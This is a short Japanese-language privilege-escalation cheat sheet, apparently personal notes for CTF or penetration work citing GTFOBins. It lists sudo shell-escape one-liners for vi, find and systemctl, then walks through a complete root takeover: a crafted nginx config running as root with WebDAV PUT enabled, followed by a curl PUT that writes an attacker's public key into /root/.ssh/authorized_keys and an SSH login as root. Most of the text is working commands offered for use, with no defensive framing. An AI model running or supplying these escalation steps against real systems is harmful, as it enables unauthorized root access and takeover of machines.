# GTFOBins  
https://gtfobins.github.io/  

```bash
# viの悪用
:set shell=/bin/sh
:shell
# findの悪用
sudo find . -exec /bin/sh \; -quit
# systemctlとpagerの悪用
sudo systemctl status <サービス>
- (press RETURN)!sh
```

# ssh + nginx + WebDAVの悪用
1. nginxを任意の設定ファイルで起動できる権限があれば可能。
2. 攻撃者は以下の設定を含む任意のnginx設定ファイルを作成。
   1. `user root;` nginxをroot権限で実行
   2. `root /;` Webサーバーのドキュメントルートをターゲットのルートに設定
   3. 外部からファイルをアップロードするためのWevDav機能とPUTメソッドを有効化
3. 攻撃者は自身のローカルマシンからWebDAV PUTメソッドを使用してターゲットのファイルシステムに任意のファイルをroot権限で書き込む。
4. 攻撃者は自身のローカルマシンでSSHキーペアを生成。
5. WebDAV PUTメソッドを利用して生成した公開鍵をターゲットの`/root/.ssh/authorized_keys`に書き込む。
6. rootのSSH設定が書き換えられたため、攻撃者は生成した秘密鍵によりrootとしてsshログインが可能。
```bash
touch /tmp/pwn.conf
# pwn.conf
user root;
worker_processes 4;
pid /tmp/nginx.pid;
events {
  worker_connections 768;
}
http {
  server {
    listen 1337;
    root /;
    autoindex on;
    dav_methods PUT;
  }
}
sudo /usr/sbin/nginx -c /tmp/pwn.conf
ss -tlnp # 1337が開いているかどうか確認
ssh-keygen # ./rootに生成
ls # rootとroot.pubがあるのを確認
curl -X PUT localhost:1337/root/.ssh/authorized_keys -d "$(cat root.pub)" # WebDAV PUTメソッドで公開鍵を登録
ssh -i root root@localhost
```
